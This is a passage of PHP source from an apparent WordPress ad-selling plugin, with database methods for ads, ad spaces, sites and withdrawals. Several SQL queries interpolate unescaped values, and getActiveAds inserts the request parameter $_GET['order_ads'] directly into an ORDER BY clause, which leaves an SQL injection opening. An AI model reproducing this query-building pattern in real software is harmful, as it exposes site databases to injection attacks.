//				 echo date('Y-m-d H:i:s', $timeTo).'<br>';
//				var_dump($result_count[0]); echo '<br>'; echo date('Y-m-d H:i:s', $time).'<br>';
			}
		}

		if ( isset($result_custom['custom']) && $result_custom['custom'] != '' && $type == 'click' || isset($result_custom[0]) && $result_custom[0] != '' && $type == 'view' ) {
			if ( $type == 'click' ) {
				$result = $result_custom['custom'];
			} else {
				$result = $result_custom[0];
			}
		} else {
			if ( $type == 'click' ) {
				$sql = "SELECT count(1) FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'click' AND status = 'correct' ORDER BY id DESC LIMIT 1";
			} else {
				$sql = "SELECT count(1) FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'view' AND status = 'correct' ORDER BY id DESC LIMIT 1";
			}
			$get_result = $this->wpdb->get_col($sql);
			$result = $get_result[0];

			if ( $type == 'click' && $result && $result_custom['id'] ) {
				$this->wpdb->update(
					$this->getTableName('stats'),
					array(
						'custom' => $result
					),
					array( 'id' => $result_custom['id'] )
				);
			}
		}

		if ( $result ) {
			return $result;
		} else {
			return NULL;
		}
	}

	public function getPendingAds($adm_type = null, $id = null)
	{
		$table_name = $this->getTableName('ads');
		$currently_time = time();

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND status = 'pending' AND space_id IN ({$this->getUserSpaces()})) OR
							(ad_model = 'cpm' AND ad_limit > 0 AND status = 'pending' AND space_id IN ({$this->getUserSpaces()})) OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND status = 'pending' AND space_id IN ({$this->getUserSpaces()}))
					ORDER BY id DESC;";
		} elseif ( $adm_type == 'admin_dashboard' ) { // ADMIN - DASHBOARD
			$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND status = 'pending' AND space_id IN ({$this->getUserSpaces('id', 'admin_dashboard')})) OR
							(ad_model = 'cpm' AND ad_limit > 0 AND status = 'pending' AND space_id IN ({$this->getUserSpaces('id', 'admin_dashboard')})) OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND status = 'pending' AND space_id IN ({$this->getUserSpaces('id', 'admin_dashboard')}))
					ORDER BY id DESC;";
		} elseif ( $adm_type == 'pending_ads' ) { // PENDING IN SPACE
			$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND status = 'pending' AND space_id = {$id}) OR
							(ad_model = 'cpm' AND ad_limit > 0 AND status = 'pending' AND space_id = {$id}) OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND status = 'pending' AND space_id = {$id})
					ORDER BY id DESC;";
		} else { // ADMIN - MARKETING AGENCY
			$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND status = 'pending' AND space_id IN ({$this->getUserSpaces()})) OR
							(ad_model = 'cpm' AND ad_limit > 0 AND status = 'pending' AND space_id IN ({$this->getUserSpaces()})) OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND status = 'pending' AND space_id IN ({$this->getUserSpaces()}))
					ORDER BY id DESC;";
		}
		$results = $this->wpdb->get_results($sql, ARRAY_A);
		$results = apply_filters( "bsa-pro-sqlGetAds", $results,	 $this->getUserSpaces(), 0, __FUNCTION__);

		return $results;
	}

	public function getLastAds($limit = 5, $adm_type = NULL)
	{
		$table_name = $this->getTableName('ads');
		$currently_time = time();

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND paid = 1 AND status = 'active') AND
							space_id IN ({$this->getUserSpaces()}) OR
							(ad_model = 'cpm' AND ad_limit > 0 AND paid = 1 AND status = 'active') AND
							space_id IN ({$this->getUserSpaces()}) OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND paid = 1 AND status = 'active') AND
							space_id IN ({$this->getUserSpaces()})
					ORDER BY id DESC LIMIT {$limit}";
		} else { // ADMIN - MARKETING AGENCY
			$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND paid = 1 AND status = 'active') AND
							space_id NOT IN ({$this->getUserSpaces()}) OR
							(ad_model = 'cpm' AND ad_limit > 0 AND paid = 1 AND status = 'active') AND
							space_id NOT IN ({$this->getUserSpaces()}) OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND paid = 1 AND status = 'active') AND
							space_id NOT IN ({$this->getUserSpaces()})
					ORDER BY id DESC LIMIT {$limit}";
		}
		$results = $this->wpdb->get_results($sql, ARRAY_A);

		return $results;
	}

	public function getActiveAds($id, $limit = 25, $list_type = null, $skip_ads = null)
	{
		$table_name 		= $this->getTableName('ads');
		$currently_time 	= time();
		$order_ads 			= ( isset($_GET['order_ads']) ? $_GET['order_ads'] : ( bsa_space($id, 'order_ads') ? bsa_space($id, 'order_ads') : 'id' ) );

		if ( isset($_GET['order_ads']) ) {
			if ( $_GET['order_ads'] == 'id' || $_GET['order_ads'] == 'ad_limit' || $_GET['order_ads'] == 'priority' || $_GET['order_ads'] == 'cost' ) {
				$this->changeSpaceOrderBy($id, $_GET['order_ads']);
			}
		}

		if ( bsa_space($id, 'status') == 'active' ) {
			if ( $list_type == "admin" or bsa_space($id, 'random') == 0 && bsa_space($id, 'display_type') != 'carousel' ) {
				if ( $skip_ads != null && $skip_ads != '' ) {
					$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND space_id = {$id} AND paid != 0 AND status = 'active' AND id NOT IN ({$skip_ads})) OR
							(ad_model = 'cpm' AND ad_limit > 0 AND space_id = {$id} AND paid != 0 AND status = 'active' AND id NOT IN ({$skip_ads})) OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND space_id = {$id} AND paid != 0 AND status = 'active' AND id NOT IN ({$skip_ads}))
					ORDER BY {$order_ads} DESC LIMIT {$limit}";
				} else {
					$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND space_id = {$id} AND paid != 0 AND status = 'active') OR
							(ad_model = 'cpm' AND ad_limit > 0 AND space_id = {$id} AND paid != 0 AND status = 'active') OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND space_id = {$id} AND paid != 0 AND status = 'active')
					ORDER BY {$order_ads} DESC LIMIT {$limit}";
				}
			} else {
				if ( bsa_space($id, 'display_type') != 'carousel' ) {
					$limit = bsa_space($id, 'col_per_row');
				}
				if ( $skip_ads != null && $skip_ads != '' ) {
					$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND space_id = {$id} AND paid != 0 AND status = 'active' AND id NOT IN ({$skip_ads})) OR
							(ad_model = 'cpm' AND ad_limit > 0 AND space_id = {$id} AND paid != 0 AND status = 'active' AND id NOT IN ({$skip_ads})) OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND space_id = {$id} AND paid != 0 AND status = 'active' AND id NOT IN ({$skip_ads}))
					ORDER BY RAND() LIMIT {$limit}";
				} else {
					$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND space_id = {$id} AND paid != 0 AND status = 'active') OR
							(ad_model = 'cpm' AND ad_limit > 0 AND space_id = {$id} AND paid != 0 AND status = 'active') OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND space_id = {$id} AND paid != 0 AND status = 'active')
					ORDER BY RAND() LIMIT {$limit}";
				}
			}
			$results = $this->wpdb->get_results($sql, ARRAY_A);
			$results = apply_filters( "bsa-pro-sqlGetAds", $results, $id, $limit, __FUNCTION__);
		} else {
			$results = NULL;
		}

		return $results;
	}

	public function getNotPaidAds($id, $limit = 10)
	{
		$table_name = $this->getTableName('ads');
		$currently_time = time();

		$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit > 0 AND space_id = {$id} AND paid = 0 AND status = 'active') OR
							(ad_model = 'cpm' AND ad_limit > 0 AND space_id = {$id} AND paid = 0 AND status = 'active') OR
							(ad_model = 'cpd' AND ad_limit >= {$currently_time} AND space_id = {$id} AND paid = 0 AND status = 'active')
					ORDER BY id DESC LIMIT {$limit}";
		$results = $this->wpdb->get_results($sql, ARRAY_A);
		$results = apply_filters( "bsa-pro-sqlGetAds", $results, $id, $limit, __FUNCTION__);
		return $results;
	}

	public function getBlockedAds($id, $limit = 10)
	{
		$table_name = $this->getTableName('ads');

		$sql = "SELECT * FROM {$table_name}
					WHERE space_id = {$id} AND status = 'blocked'
					ORDER BY id DESC LIMIT {$limit}";
		$results = $this->wpdb->get_results($sql, ARRAY_A);

		return $results;
	}

	public function getArchiveAds($id, $limit = 10)
	{
		$table_name = $this->getTableName('ads');
		$currently_time = time();

		$sql = "SELECT * FROM {$table_name}
					WHERE 	(ad_model = 'cpc' AND ad_limit = 0 AND space_id = {$id} AND status != 'removed') OR
							(ad_model = 'cpm' AND ad_limit = 0 AND space_id = {$id} AND status != 'removed') OR
							(ad_model = 'cpd' AND ad_limit < {$currently_time} AND space_id = {$id} AND status != 'removed')
					ORDER BY id DESC LIMIT {$limit}";
		$results = $this->wpdb->get_results($sql, ARRAY_A);
		$results = apply_filters( "bsa-pro-sqlGetAds", $results, $id, $limit, __FUNCTION__);
		return $results;
	}

	public function getSites($adm_type = NULL, $status = NULL)
	{
		$table_name = $this->getTableName('sites');

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT * FROM {$table_name}
					WHERE id IN ({$this->getUserSites('id', bsa_role())})
					ORDER BY id DESC, status";
		} elseif ( $adm_type == 'agency_form' ) { // AGENCY FORM
			$sql = "SELECT * FROM {$table_name}
					WHERE status = 'active'
					ORDER BY title, id DESC, status";
		} else { // ADMIN - MARKETING AGENCY
			if ( $status == 'pending' ) {
				$sql = "SELECT * FROM {$table_name}
					WHERE status = 'pending'
					ORDER BY id DESC, status";
			} else {
				$sql = "SELECT * FROM {$table_name}
					WHERE 1
					ORDER BY id DESC, status";
			}
		}
		$results = $this->wpdb->get_results($sql, ARRAY_A);

		return $results;
	}

	public function getWithdrawals($status = NULL, $adm_type = NULL)
	{
		$table_name = $this->getTableName('withdrawals');
		$user_id = get_current_user_id();

		if ( $adm_type == 'user') { // USER - MARKETING AGENCY
			if ( $status == 'pending' ) {
				$sql = "SELECT * FROM {$table_name}
						WHERE status = 'pending' AND user_id = {$user_id}
						ORDER BY id DESC, status";
			} else {
				$sql = "SELECT * FROM {$table_name}
						WHERE user_id = {$user_id}
						ORDER BY id DESC, status";
			}
		} else { // ADMIN - MARKETING AGENCY
			if ( $status == 'pending' ) {
				$sql = "SELECT * FROM {$table_name}
						WHERE status = 'pending'
						ORDER BY id DESC, status";
			} else {
				$sql = "SELECT * FROM {$table_name}
						ORDER BY id DESC, status";
			}
		}
		$results = $this->wpdb->get_results($sql, ARRAY_A);

		return $results;
	}

	// Add new Space to DB
	public function addNewSpace($id = NULL, $name, $title, $add_new, $cpc_price, $cpm_price, $cpd_price,
								$cpc_contract_1, $cpc_contract_2, $cpc_contract_3, $cpm_contract_1, $cpm_contract_2, $cpm_contract_3, $cpd_contract_1, $cpd_contract_2, $cpd_contract_3,
								$discount_2, $discount_3, $grid_system, $template, $display_type, $random, $max_items, $col_per_row, $font, $font_url,
								$header_bg, $header_color, $link_color, $ads_bg, $ad_bg, $ad_title_color, $ad_desc_color, $ad_url_color, $ad_extra_color_1, $ad_extra_color_2, $animation, $in_categories, $has_tags,
								$show_in_country, $hide_in_country, $show_in_advanced, $hide_in_advanced, $devices, $unavailable_dates, $close_action, $status, $site_id = NULL, $adm_type = NULL)
	{
		$this->addNewSpaceDB($id, $name, $title, $add_new, $cpc_price, $cpm_price, $cpd_price,
							$cpc_contract_1, $cpc_contract_2, $cpc_contract_3, $cpm_contract_1, $cpm_contract_2, $cpm_contract_3, $cpd_contract_1, $cpd_contract_2, $cpd_contract_3,
							$discount_2, $discount_3, $grid_system, $template, $display_type, $random, $max_items, $col_per_row, $font, $font_url,
							$header_bg, $header_color, $link_color, $ads_bg, $ad_bg, $ad_title_color, $ad_desc_color, $ad_url_color, $ad_extra_color_1, $ad_extra_color_2, $animation, $in_categories, $has_tags,
							$show_in_country, $hide_in_country, $show_in_advanced, $hide_in_advanced, $devices, $unavailable_dates, $close_action, $status, $site_id, $adm_type);
	}

	protected function addNewSpaceDB($id = NULL, $name, $title, $add_new, $cpc_price, $cpm_price, $cpd_price,
									$cpc_contract_1, $cpc_contract_2, $cpc_contract_3, $cpm_contract_1, $cpm_contract_2, $cpm_contract_3, $cpd_contract_1, $cpd_contract_2, $cpd_contract_3,
									$discount_2, $discount_3, $grid_system, $template, $display_type, $random, $max_items, $col_per_row, $font, $font_url,
									$header_bg, $header_color, $link_color, $ads_bg, $ad_bg, $ad_title_color, $ad_desc_color, $ad_url_color, $ad_extra_color_1, $ad_extra_color_2, $animation, $in_categories, $has_tags,
									$show_in_country, $hide_in_country, $show_in_advanced, $hide_in_advanced, $devices, $unavailable_dates, $close_action, $status, $site_id, $adm_type) {
		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$this->wpdb->insert(
				$this->getTableName('spaces'),
				array(
					'id' 				=> $id,
					'site_id' 			=> $site_id,
					'name' 				=> $name,
					'title' 			=> $title,
					'add_new' 			=> $add_new,
					'cpc_price' 		=> $cpc_price,
					'cpm_price' 		=> $cpm_price,
					'cpd_price' 		=> $cpd_price,
					'cpc_contract_1' 	=> $cpc_contract_1,
					'cpc_contract_2' 	=> $cpc_contract_2,
					'cpc_contract_3' 	=> $cpc_contract_3,
					'cpm_contract_1' 	=> $cpm_contract_1,
					'cpm_contract_2' 	=> $cpm_contract_2,
					'cpm_contract_3' 	=> $cpm_contract_3,
					'cpd_contract_1' 	=> $cpd_contract_1,
					'cpd_contract_2' 	=> $cpd_contract_2,
					'cpd_contract_3' 	=> $cpd_contract_3,
					'discount_2' 		=> ($discount_2 > 0 ? ($discount_2 >= 100 ? 100 : $discount_2) : 0),
					'discount_3' 		=> ($discount_3 > 0 ? ($discount_3 >= 100 ? 100 : $discount_3) : 0),
					'grid_system' 		=> $grid_system,
					'template' 			=> $template,
					'display_type' 		=> $display_type,
					'random' 			=> $random,
					'max_items' 		=> $max_items,
					'col_per_row' 		=> $col_per_row,
					'font' 				=> str_replace("\\'", "", $font),
					'font_url' 			=> $font_url,
					'header_bg' 		=> $header_bg,
					'header_color' 		=> $header_color,
					'link_color' 		=> $link_color,
					'ads_bg' 			=> $ads_bg,
					'ad_bg' 			=> $ad_bg,
					'ad_title_color' 	=> $ad_title_color,
					'ad_desc_color' 	=> $ad_desc_color,
					'ad_url_color' 		=> $ad_url_color,
					'ad_extra_color_1' 	=> $ad_extra_color_1,
					'ad_extra_color_2' 	=> $ad_extra_color_2,
					'animation' 		=> $animation,
					'in_categories' 	=> $in_categories,
					'has_tags' 			=> $has_tags,
					'show_in_country' 	=> $show_in_country,
					'hide_in_country' 	=> $hide_in_country,
					'show_in_advanced' 	=> $show_in_advanced,
					'hide_in_advanced' 	=> $hide_in_advanced,
					'devices' 			=> $devices,
					'unavailable_dates' => $unavailable_dates,
					'close_action' 		=> $close_action,
					'status' 			=> $status
				),
				array()
			);
		} else { // ADMIN - MARKETING AGENCY
			$this->wpdb->insert(
				$this->getTableName('spaces'),
				array(
					'id' 				=> $id,
					'name' 				=> $name,
					'title' 			=> $title,
					'add_new' 			=> $add_new,
					'cpc_price' 		=> $cpc_price,
					'cpm_price' 		=> $cpm_price,
					'cpd_price' 		=> $cpd_price,
					'cpc_contract_1' 	=> $cpc_contract_1,
					'cpc_contract_2' 	=> $cpc_contract_2,
					'cpc_contract_3' 	=> $cpc_contract_3,
					'cpm_contract_1' 	=> $cpm_contract_1,
					'cpm_contract_2' 	=> $cpm_contract_2,
					'cpm_contract_3' 	=> $cpm_contract_3,
					'cpd_contract_1' 	=> $cpd_contract_1,
					'cpd_contract_2' 	=> $cpd_contract_2,
					'cpd_contract_3' 	=> $cpd_contract_3,
					'discount_2' 		=> ($discount_2 > 0 ? ($discount_2 >= 100 ? 100 : $discount_2) : 0),
					'discount_3' 		=> ($discount_3 > 0 ? ($discount_3 >= 100 ? 100 : $discount_3) : 0),
					'grid_system' 		=> $grid_system,
					'template' 			=> $template,
					'display_type' 		=> $display_type,
					'random' 			=> $random,
					'max_items' 		=> $max_items,
					'col_per_row' 		=> $col_per_row,
					'font' 				=> str_replace("\\'", "", $font),
					'font_url' 			=> $font_url,
					'header_bg' 		=> $header_bg,
					'header_color' 		=> $header_color,
					'link_color' 		=> $link_color,
					'ads_bg' 			=> $ads_bg,
					'ad_bg' 			=> $ad_bg,
					'ad_title_color' 	=> $ad_title_color,
					'ad_desc_color' 	=> $ad_desc_color,
					'ad_url_color' 		=> $ad_url_color,
					'ad_extra_color_1' 	=> $ad_extra_color_1,
					'ad_extra_color_2' 	=> $ad_extra_color_2,
					'animation' 		=> $animation,
					'in_categories' 	=> $in_categories,
					'has_tags' 			=> $has_tags,
					'show_in_country' 	=> $show_in_country,
					'hide_in_country' 	=> $hide_in_country,
					'show_in_advanced' 	=> $show_in_advanced,
					'hide_in_advanced' 	=> $hide_in_advanced,
					'devices' 			=> $devices,
					'unavailable_dates' => $unavailable_dates,
					'close_action' 		=> $close_action,
					'status' 			=> $status
				),
				array()
			);
		}
	}

	// Updated Space in DB
	public function updateSpace($id, $name, $title, $add_new, $cpc_price, $cpm_price, $cpd_price,
								$cpc_contract_1, $cpc_contract_2, $cpc_contract_3, $cpm_contract_1, $cpm_contract_2, $cpm_contract_3, $cpd_contract_1, $cpd_contract_2, $cpd_contract_3,
								$discount_2, $discount_3, $grid_system, $template, $display_type, $random, $max_items, $col_per_row, $font, $font_url,
								$header_bg, $header_color, $link_color, $ads_bg, $ad_bg, $ad_title_color, $ad_desc_color, $ad_url_color, $ad_extra_color_1, $ad_extra_color_2, $animation, $in_categories, $has_tags,
								$show_in_country, $hide_in_country, $show_in_advanced, $hide_in_advanced, $devices, $unavailable_dates, $close_action, $status, $site_id = NULL, $adm_type = NULL)
	{
		$this->updateSpaceDB($id, $name, $title, $add_new, $cpc_price, $cpm_price, $cpd_price,
			$cpc_contract_1, $cpc_contract_2, $cpc_contract_3, $cpm_contract_1, $cpm_contract_2, $cpm_contract_3, $cpd_contract_1, $cpd_contract_2, $cpd_contract_3,
			$discount_2, $discount_3, $grid_system, $template, $display_type, $random, $max_items, $col_per_row, $font, $font_url,
			$header_bg, $header_color, $link_color, $ads_bg, $ad_bg, $ad_title_color, $ad_desc_color, $ad_url_color, $ad_extra_color_1, $ad_extra_color_2, $animation, $in_categories, $has_tags,
			$show_in_country, $hide_in_country, $show_in_advanced, $hide_in_advanced, $devices, $unavailable_dates, $close_action, $status, $site_id, $adm_type);
	}

	protected function updateSpaceDB($id, $name, $title, $add_new, $cpc_price, $cpm_price, $cpd_price,
									 $cpc_contract_1, $cpc_contract_2, $cpc_contract_3, $cpm_contract_1, $cpm_contract_2, $cpm_contract_3, $cpd_contract_1, $cpd_contract_2, $cpd_contract_3,
									 $discount_2, $discount_3, $grid_system, $template, $display_type, $random, $max_items, $col_per_row, $font, $font_url,
									 $header_bg, $header_color, $link_color, $ads_bg, $ad_bg, $ad_title_color, $ad_desc_color, $ad_url_color, $ad_extra_color_1, $ad_extra_color_2, $animation, $in_categories, $has_tags,
									 $show_in_country, $hide_in_country, $show_in_advanced, $hide_in_advanced, $devices, $unavailable_dates, $close_action, $status, $site_id, $adm_type) {
		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$this->wpdb->update(
				$this->getTableName('spaces'),
				array(
					'site_id' 			=> $site_id,
					'name' 				=> $name,
					'title' 			=> $title,
					'add_new' 			=> $add_new,
					'cpc_price' 		=> $cpc_price,
					'cpm_price' 		=> $cpm_price,
					'cpd_price' 		=> $cpd_price,
					'cpc_contract_1' 	=> $cpc_contract_1,
					'cpc_contract_2' 	=> $cpc_contract_2,
					'cpc_contract_3' 	=> $cpc_contract_3,
					'cpm_contract_1' 	=> $cpm_contract_1,
					'cpm_contract_2' 	=> $cpm_contract_2,
					'cpm_contract_3' 	=> $cpm_contract_3,
					'cpd_contract_1' 	=> $cpd_contract_1,
					'cpd_contract_2' 	=> $cpd_contract_2,
					'cpd_contract_3' 	=> $cpd_contract_3,
					'discount_2' 		=> ($discount_2 > 0 ? ($discount_2 >= 100 ? 100 : $discount_2) : 0),
					'discount_3' 		=> ($discount_3 > 0 ? ($discount_3 >= 100 ? 100 : $discount_3) : 0),
					'grid_system' 		=> $grid_system,
					'template' 			=> $template,
					'display_type' 		=> $display_type,
					'random' 			=> $random,
					'max_items' 		=> $max_items,
					'col_per_row' 		=> $col_per_row,
					'font' 				=> str_replace("\\'", "", $font),
					'font_url' 			=> $font_url,
					'header_bg' 		=> $header_bg,
					'header_color' 		=> $header_color,
					'link_color' 		=> $link_color,
					'ads_bg' 			=> $ads_bg,
					'ad_bg' 			=> $ad_bg,
					'ad_title_color' 	=> $ad_title_color,
					'ad_desc_color' 	=> $ad_desc_color,
					'ad_url_color' 		=> $ad_url_color,
					'ad_extra_color_1' 	=> $ad_extra_color_1,
					'ad_extra_color_2' 	=> $ad_extra_color_2,
					'animation' 		=> $animation,
					'in_categories' 	=> $in_categories,
					'has_tags' 			=> $has_tags,
					'show_in_country' 	=> $show_in_country,
					'hide_in_country' 	=> $hide_in_country,
					'show_in_advanced' 	=> $show_in_advanced,
					'hide_in_advanced' 	=> $hide_in_advanced,
					'devices' 			=> $devices,
					'unavailable_dates' => $unavailable_dates,
					'close_action' 		=> $close_action,
					'status' 			=> $status
				),
				array( 'id' => $id )
			);
		} else { // ADMIN - MARKETING AGENCY
			$this->wpdb->update(
				$this->getTableName('spaces'),
				array(
					'name' 				=> $name,
					'title' 			=> $title,
					'add_new' 			=> $add_new,
					'cpc_price' 		=> $cpc_price,
					'cpm_price' 		=> $cpm_price,
					'cpd_price' 		=> $cpd_price,
					'cpc_contract_1' 	=> $cpc_contract_1,
					'cpc_contract_2' 	=> $cpc_contract_2,
					'cpc_contract_3' 	=> $cpc_contract_3,
					'cpm_contract_1' 	=> $cpm_contract_1,
					'cpm_contract_2' 	=> $cpm_contract_2,
					'cpm_contract_3' 	=> $cpm_contract_3,
					'cpd_contract_1' 	=> $cpd_contract_1,
					'cpd_contract_2' 	=> $cpd_contract_2,
					'cpd_contract_3' 	=> $cpd_contract_3,
					'discount_2' 		=> ($discount_2 > 0 ? ($discount_2 >= 100 ? 100 : $discount_2) : 0),
					'discount_3' 		=> ($discount_3 > 0 ? ($discount_3 >= 100 ? 100 : $discount_3) : 0),
					'grid_system' 		=> $grid_system,
					'template' 			=> $template,
					'display_type' 		=> $display_type,
					'random' 			=> $random,
					'max_items' 		=> $max_items,
					'col_per_row' 		=> $col_per_row,
					'font' 				=> str_replace("\\'", "", $font),
					'font_url' 			=> $font_url,
					'header_bg' 		=> $header_bg,
					'header_color' 		=> $header_color,
					'link_color' 		=> $link_color,
					'ads_bg' 			=> $ads_bg,
					'ad_bg' 			=> $ad_bg,
					'ad_title_color' 	=> $ad_title_color,
					'ad_desc_color' 	=> $ad_desc_color,
					'ad_url_color' 		=> $ad_url_color,
					'ad_extra_color_1' 	=> $ad_extra_color_1,
					'ad_extra_color_2' 	=> $ad_extra_color_2,
					'animation' 		=> $animation,
					'in_categories' 	=> $in_categories,
					'has_tags' 			=> $has_tags,
					'show_in_country' 	=> $show_in_country,
					'hide_in_country' 	=> $hide_in_country,
					'show_in_advanced' 	=> $show_in_advanced,
					'hide_in_advanced' 	=> $hide_in_advanced,
					'devices' 			=> $devices,
					'unavailable_dates' => $unavailable_dates,
					'close_action' 		=> $close_action,
					'status' 			=> $status
				),
				array( 'id' => $id )
			);
		}
	}

	// Add new Ad to DB
	public function addNewAd($id = NULL, $space_id, $buyer_email, $title, $description, $url, $img, $html, $capping, $ad_model, $ad_limit, $cost, $paid, $status)
	{
		$this->addNewAdDB($id, $space_id, $buyer_email, $title, $description, $url, $img, $html, $capping, $ad_model, $ad_limit, $cost, $paid, $status);
	}

	protected function addNewAdDB($id, $space_id, $buyer_email, $title, $description, $url, $img, $html, $capping, $ad_model, $ad_limit, $cost, $paid, $status) {
		$this->wpdb->insert(
			$this->getTableName('ads'),
			array(
				'id' 			=> $id,
				'space_id' 		=> $space_id,
				'buyer_email' 	=> $buyer_email,
				'title' 		=> stripslashes($title),
				'description' 	=> stripslashes($description),
				'url' 			=> $url,
				'img' 			=> $img,
				'html' 			=> $html,
				'ad_model' 		=> $ad_model,
				'capping' 		=> $capping,
				'ad_limit' 		=> $ad_limit,
				'cost' 			=> $cost,
				'paid' 			=> $paid, // 0 - not paid, 1 - paid, 2 - Added via Admin Panel
				'status' 		=> $status
			),
			array()
		);
		$last_id = $this->wpdb->insert_id;

		if ( (bsa_role() == 'user') ) {
			$this->changeUserPrivileges(get_current_user_id(), $last_id);
		}
	}

	// Update Ad in DB
	public function updateAd($id, $buyer_email, $title, $description, $url, $img, $html, $capping, $increase_limit = null, $status = null) {
		$this->updateAdDB($id, $buyer_email, $title, $description, $url, $img, $html, $capping, $increase_limit, $status);
	}

	protected function updateAdDB($id, $buyer_email, $title, $description, $url, $img, $html, $capping, $increase_limit, $status) {
		$this->wpdb->update(
			$this->getTableName('ads'),
			array(
				'buyer_email' 	=> $buyer_email,
				'title' 		=> stripslashes($title),
				'description' 	=> stripslashes($description),
				'url' 			=> $url,
				'html' 			=> $html,
				'capping' 		=> $capping
			),
			array( 'id' => $id )
		);
		if ( isset($increase_limit) && $increase_limit != NULL ) { // INCREASE LIMIT
			$this->wpdb->update(
				$this->getTableName('ads'),
				array(
					'ad_limit' => $increase_limit
				),
				array( 'id' => $id )
			);
		}
		if ( isset($img) && $img != NULL ) { // CHANGE THUMB
			$this->wpdb->update(
				$this->getTableName('ads'),
				array(
					'img' => $img
				),
				array( 'id' => $id )
			);
		}
		if ( isset($status) && $status != NULL ) { // CHANGE STATUS
			$this->wpdb->update(
				$this->getTableName('ads'),
				array(
					'status' => $status
				),
				array( 'id' => $id )
			);
		}
	}

	// Change Ad Priority
	public function changeAdPriority($ad_id, $priority)
	{
		if ( isset($_SESSION['bsa_space_'.bsa_ad($ad_id, 'space_id')]) ) {
			unset($_SESSION['bsa_space_'.bsa_ad($ad_id, 'space_id')]); // Reset cache
		}

		if ( isset($ad_id) && isset($priority) ) {
			$this->wpdb->update(
				$this->getTableName('ads'),
				array(
					'priority' => $priority
				),
				array( 'id' => $ad_id )
			);
		}
	}

	// Change Space Order By
	public function changeSpaceOrderBy($space_id, $order_ads)
	{
		if ( isset($_SESSION['bsa_space_'.$space_id]) ) {
			unset($_SESSION['bsa_space_'.$space_id]); // Reset cache
		}

		if ( isset($space_id) && isset($order_ads) ) {
			$this->wpdb->update(
				$this->getTableName('spaces'),
				array(
					'order_ads' => $order_ads
				),
				array( 'id' => $space_id )
			);
		}
	}

	// Add new Site to DB
	public function addNewSite($id = NULL, $title, $url, $thumb, $status)
	{
		$this->addNewSiteDB($id, $title, $url, $thumb, $status);
	}

	protected function addNewSiteDB($id, $title, $url, $thumb, $status) {
		$this->wpdb->insert(
			$this->getTableName('sites'),
			array(
				'id' => $id,
				'user_id' => get_current_user_id(),
				'title' => $title,
				'url' => $url,
				'thumb' => $thumb,
				'status' => $status
			),
			array()
		);
	}

	// Update Site in DB
	public function updateSite($id, $title, $url, $thumb, $status) {
		$this->updateSiteDB($id, $title, $url, $thumb, $status);
	}

	protected function updateSiteDB($id, $title, $url, $thumb, $status) {
		if ( bsa_verify_role($id, 'site') ) {
			$this->wpdb->update(
				$this->getTableName('sites'),
				array(
					'id' => $id,
					'title' => $title,
					'url' => $url,
					'status' => $status
				),
				array( 'id' => $id )
			);
			if ( isset($thumb) && $thumb != NULL ) {
				$this->wpdb->update(
					$this->getTableName('sites'),
					array(
						'thumb' => $thumb
					),
					array( 'id' => $id )
				);
			}
		}
	}

	protected $orderId;
	protected function adminAction()
	{
		if ( isset($_POST) && isset($_POST['bsaProAction']) && isset($_POST['submit']) && isset($_POST['orderId']) ||
			 isset($_GET['space_id']) && isset($_GET['remove_action']) && isset($_GET['remove_confirm']) ||
			 isset($_POST) && isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'updateAdd-on' ||
			 isset($_POST) && isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'free-ads' ||
			 isset($_POST) && isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'give-access' ||
			 isset($_POST) && isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'task-ad' ||
			 isset($_POST) && isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'task-space' ||
			 isset($_POST) && isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'close-task' ) {

			$this->orderId = (isset($_POST['orderId']) ? $_POST['orderId'] : NULL);

			if (isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'block') { // BLOCK ADS ACTION

				if ( bsa_verify_role($this->orderId, 'ad') ) {

					$sql = $this->wpdb->update(
						$this->getTableName('ads'),
						array(
							'status' => 'blocked'
						),
						array( 'id' => $this->orderId )
					);

					if ($sql > 0) {
						$_SESSION['validationStatus'] = 'blocked';
						return 'blocked';
					} else {
						return NULL;
					}
				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error.</strong> You do not have sufficient permissions to access this page.</p>
						</div>';
				}

			} elseif (isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'unblock') { // UNBLOCK ADS ACTION

